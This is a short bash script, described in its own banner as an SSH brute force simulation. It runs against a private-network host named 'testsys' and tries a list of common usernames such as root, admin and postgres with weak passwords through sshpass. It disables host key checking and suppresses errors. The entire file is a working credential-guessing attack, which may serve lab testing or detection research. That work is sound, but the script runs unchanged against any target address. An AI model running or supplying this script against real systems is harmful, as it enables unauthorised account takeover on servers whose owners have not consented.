#!/bin/bash
TARGET="192.168.253.151"
echo "[*] Starting SSH brute force simulation against $TARGET (testsys)"

USERS=("root" "admin" "ubuntu" "pi" "test" "oracle" "postgres")
PASSES=("password" "123456" "admin" "letmein" "qwerty")

for user in "${USERS[@]}"; do
  for pass in "${PASSES[@]}"; do
    sshpass -p "$pass" ssh \
      -o StrictHostKeyChecking=no \
      -o ConnectTimeout=2 \
      -o UserKnownHostsFile=/dev/null \
      "$user@$TARGET" exit 2>/dev/null
    sleep 0.2
  done
done

echo "[*] Done."